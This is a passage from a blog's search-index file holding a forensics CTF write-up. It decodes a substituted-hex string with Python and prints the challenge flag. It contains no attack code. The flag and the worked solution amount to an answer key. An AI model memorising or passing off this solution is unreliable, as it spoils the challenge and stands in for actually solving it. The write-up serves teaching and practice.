6DB53BB3653166686#68BA6765643*3160626C6531BAB5B36531B46D31BBB362B131B4676531666*626B31686#31B4676531B1B36DB165B331666DB36062B43#19B7B16453655B45666#6DA443B4B653655547B7B5A7B443B36C6#B85567A2A3A7446D6*BA5B67A26DB9AB6A6#5544B86B48B76C4A48B4BBBAA1A5B64#A75A646C46B1545153B6564#556A5354B46D5AABB945556266AB4D4#48AA6#A155B456B5486*68A8436A5166B7454A586044485DA445AAB349425567584B56A8BB4D4648</code></p><p>Then we do the keys substituition as replacing <code>123A456B789C*0#D</code> by <code>0123456789ABCDEF</code> and print the hex decoded value using python.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">input_string = <span class="string">&quot;xpdReWEfno4BtvReUHxu8tBrknyUh128DolsWh1oz7cnUDygIxkCItws05vN8SdkFpTPRvVNUcRTtoS7zEUaf7ONI3n0UtVuIli9BcPfxECYmDI_4E3rJAUhYGV9wOFI&quot;</span></span><br><span class="line"></span><br><span class="line">hex_indices = [</span><br><span class="line">    <span class="number">0x61</span>, <span class="number">0x72</span>, <span class="number">0x6c</span>, <span class="number">0x38</span>, <span class="number">0x2b</span>, <span class="number">0x6f</span>, <span class="number">0x3e</span>, <span class="number">0x59</span>, <span class="number">0x6c</span>, <span class="number">0x38</span>, </span><br><span class="line">    <span class="number">0x19</span>, <span class="number">0x6f</span>, <span class="number">0x1d</span>, <span class="number">0x72</span>, <span class="number">0x0a</span>, <span class="number">0x45</span>, <span class="number">0x59</span>, <span class="number">0x6f</span>, <span class="number">0x6c</span>, <span class="number">0x2e</span>, </span><br><span class="line">    <span class="number">0x6f</span>, <span class="number">0x6c</span>, <span class="number">0x26</span>, <span class="number">0x2b</span>, <span class="number">0x02</span>, <span class="number">0x6f</span>, <span class="number">0x01</span>, <span class="number">0x26</span>, <span class="number">0x72</span>, <span class="number">0x53</span>, </span><br><span class="line">    <span class="number">0x39</span>, <span class="number">0x04</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">resultant_string = <span class="string">&#x27;&#x27;</span>.join(input_string[index] <span class="keyword">for</span> index <span class="keyword">in</span> hex_indices)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(resultant_string)</span><br></pre></td></tr></table></figure><p>Then we get the following message:</p><p><img src="/./images/Touch_Tone_Telephone_1.png" alt="Image 1"></p><p>Now comes the part to reverse this code so we write another code to solve this task which extract the characters of the flag based on the given indices of the garbage given in the end.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mapping = &#123;</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;7&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;*&#x27;</span>: <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;#&#x27;</span>: <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;F&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">encoded_str = (<span class="string">&quot;47656*6*6D3#315B656*6A6D606531B46D31B4676531434A424A54463147656*B16*686#653#19546768BA316A626*6*316062B831636531B3656A6DB364656431666DB331B2B5626*68B4B83162BABAB5B3626#6A6531B1B5B3B16DBA65BA3#1919466DB3316A6762B33131A13*316B65B431686#6465B731A1B7A6A23#19466DB3316A6762B33131A23*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B33131A33*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B33131AA3*316B65B431686#6465B731A1B7AAA73#19466DB3316A6762B33131A43*316B65B431686#6465B731A1B7A3633#19466DB3316A6762B33131A53*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B33131A63*316B65B431686#6465B731A1B7AA653#19466DB3316A6762B33131AB3*316B65B431686#6465B731A1B7A5A83#19466DB3316A6762B33131A73*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B33131A83*316B65B431686#6465B731A1B7AAA73#19466DB3316A6762B331A2A13*316B65B431686#6465B731A1B7A2A83#19466DB3316A6762B331A2A23*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A2A33*316B65B431686#6465B731A1B7A2643#19466DB3316A6762B331A2AA3*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B331A2A43*316B65B431686#6465B731A1B7A1623#19466DB3316A6762B331A2A53*316B65B431686#6465B731A1B7A4A53#19466DB3316A6762B331A2A63*316B65B431686#6465B731A1B7A5A83#19466DB3316A6762B331A2AB3*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A2A73*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B331A2A83*316B65B431686#6465B731A1B7A3653#19466DB3316A6762B331A3A13*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A3A23*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B331A3A33*316B65B431686#6465B731A1B7A3A63#19466DB3316A6762B331A3AA3*316B65B431686#6465B731A1B7A3633#19466DB3316A6762B331A3A43*316B65B431686#6465B731A1B7A1A33#19466DB3316A6762B331A3A53*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A3A63*316B65B431686#6465B731A1B7A1A23#19466DB3316A6762B331A3AB3*316B65B431686#6465B731A1B7A3A63#19466DB3316A6762B331A3A73*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B331A3A83*316B65B431686#6465B731A1B7A5AA3#19466DB3316A6762B331AAA13*316B65B431686#6465B731A1B7AAA83#19466DB3316A6762B331AAA23*316B65B431686#6465B731A1B7A1A43#191919516*6562BA6531676D6*6431BB67686*6531BB6531BA656#6431B86DB531B3626#646D60316B62B363626B6531B46762B431B86DB531BA676DB56*6431686#6465B731686#B46D31B46D316B65B431B4676531666*626B3#195B67656#31B86DB53BB3653166686#68BA6765643*3160626C6531BAB5B36531B46D31BBB362B131B4676531666*626B31686#31B4676531B1B36DB165B331666DB36062B43#19B7B16453655B45666#6DA443B4B653655547B7B5A7B443B36C6#B85567A2A3A7446D6*BA5B67A26DB9AB6A6#5544B86B48B76C4A48B4BBBAA1A5B64#A75A646C46B1545153B6564#556A5354B46D5AABB945556266AB4D4#48AA6#A155B456B5486*68A8436A5166B7454A586044485DA445AAB349425567584B56A8BB4D4648&quot;</span>)</span><br><span class="line"></span><br><span class="line">decoded_str = <span class="string">&#x27;&#x27;</span>.join(mapping.get(char, char) <span class="keyword">for</span> char <span class="keyword">in</span> encoded_str)</span><br><span class="line"></span><br><span class="line">bytes_obj = <span class="built_in">bytes</span>.fromhex(decoded_str)</span><br><span class="line">result_string = bytes_obj.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(result_string) </span><br></pre></td></tr></table></figure><p>And that reveals us our flag:</p><p><code>bcactf&#123;l3m0n_d3m0n_134v3_my_m1nd_p13a5e&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF-Writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Forensics </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
